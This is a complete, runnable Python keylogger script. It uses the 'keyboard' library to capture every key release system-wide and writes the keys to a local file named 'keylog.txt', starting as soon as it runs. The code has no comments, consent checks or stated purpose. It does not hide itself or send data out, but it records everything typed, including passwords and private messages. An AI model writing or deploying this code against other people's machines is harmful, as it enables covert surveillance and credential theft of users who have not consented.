import keyboard

class Keylogger():
    def __init__(self, log_filename):
        self.file = open(log_filename,"w")

    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        button = event.name

        if button == "space":
            button = " "
        elif button == "enter":
            button = "\n"
            
        self.file.write(button)
        self.file.flush()


keylogger_object = Keylogger("keylog.txt")
keylogger_object.start_log()